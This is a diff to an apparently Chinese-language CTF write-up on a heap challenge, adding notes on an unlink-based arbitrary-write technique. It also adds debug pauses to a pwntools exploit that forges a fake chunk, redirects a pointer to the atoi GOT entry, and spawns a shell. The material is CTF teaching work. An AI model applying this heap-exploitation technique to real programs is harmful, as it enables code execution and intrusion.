@@ -283,6 +283,8 @@ Your choice:this is mortyflag@@
 
 #### 另一种unlink解法
 
+通过unlink让ptr最终指向的是ptr前面一点的地方，往ptr里面写payload就能够覆盖ptr本身。然后再次往ptr里面写payload，就能实现地址任意写了。
+
 最终的exp
 ```
 #!/usr/bin/env python
@@ -403,10 +405,13 @@ if __name__ =='__main__':
 
     fake_chunk += p64(0x40)+p64(0x90)       #覆盖使前一个chunk也是40byte
 
-    change(r,'0','128',fake_chunk)
-    remove(r,'1')                           #触发 unlink操作
+    change(r,'0','128',fake_chunk)          # 进行堆溢出
+    raw_input('#1')
+    remove(r,'1')                           #触发 unlink操作,效果就是0x6020c8指向的值由603030变为了06020b0(指向了ptr前面一点的位置,可以通过改写值,覆盖ptr,实现ptr值的改写)
+    raw_input('#2')
 
     payload = p64(0) * 2+ p64(0x40) + p64(0x602068)  # 这个地址是atoi_got位置
+
     change(r,'0', '128', payload)
     show(r)
     r.recvuntil("0 : ")
@@ -418,5 +423,4 @@ if __name__ =='__main__':
     r.recvuntil(":")
     r.sendline("sh")
     r.interactive()
-
 ```
